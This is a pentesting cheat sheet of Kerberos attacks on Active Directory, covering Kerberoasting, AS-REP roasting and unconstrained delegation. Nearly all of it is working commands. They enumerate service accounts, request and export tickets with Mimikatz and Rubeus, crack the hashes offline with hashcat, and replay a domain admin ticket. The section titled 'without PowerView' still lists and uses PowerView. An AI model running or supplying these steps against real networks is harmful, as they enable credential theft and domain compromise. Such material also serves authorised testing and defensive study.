# Kerberos Attacks

## Kerberoasting

Requirements:  
- PowerView
- Hashcat

```powershell
# Find user accounts used as service accounts
Get-NetUser -SPN
Request-SPNTicket "<spn>" -Format Hashcat   # If this doesn't work in hashcat, also try "-Format John"

# Save the hash via copy and paste to a text file for cracking
# Crack with hashcat
hashcat -m 13100 -a 0 hash.txt  /path/to/wordlist.txt
```

## Kerberoasting without PowerView

Requirements:  
- PowerView
- Invoke-Mimikatz.ps1 or Mimikatz.exe
- TGSrepcrack.py

```powershell
# Find user accounts used as service accounts
Get-NetUser -SPN

# Fetching SPN ticket 
Add-Type –AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken –ArgumentList ‘MSSQLSvc/jefflab-sql02.jefflab.local:1433’

# Use Invoke-Mimikatz or Mimikatz to pull these tickets from memory
Invoke-mimikatz -Command '"kerberos::list /export"' OR kerberos::list /export

# Crack with TGSrepcrack.py
python3 tgsrepcrack.py wordlist.txt <ticket>.kirbi
```

## AS-REP Roasting

Requitements:  
- Rubeus.exe
- Hashcat

```powershell
# With Rubeus and hashcat
.\Rubeus.exe asreproast
# Copy any hashes to text files
hashcat -m 18200 asreproast-hash.txt /path/to/wordlist.txt
```

## Unconstrained Delegation

Requirements:  
- High privileged user or a shell as system
- PowerView
- Invoke-Mimikatz.ps1 OR Mimikatz.exe

```powershell
# With higher privs, or a shell running as system
Get-NetComputer -UnConstrained

# Compromise where unconstrained delegation is enabled
## With Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"sekurlsa::tickets"'
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
# The DA token could be reused
Invoke-Mimikatz -Command '"kerberos::ptt C:\path\to\ticket.kirbi"'
## With Mimikatz.exe
.\mimikatz.exe
sekurlsa::tickets
sekurlsa::tickets /export
# The DA token could be reused
kerberos::ptt "C:\path\to\ticket.kirbi"
```
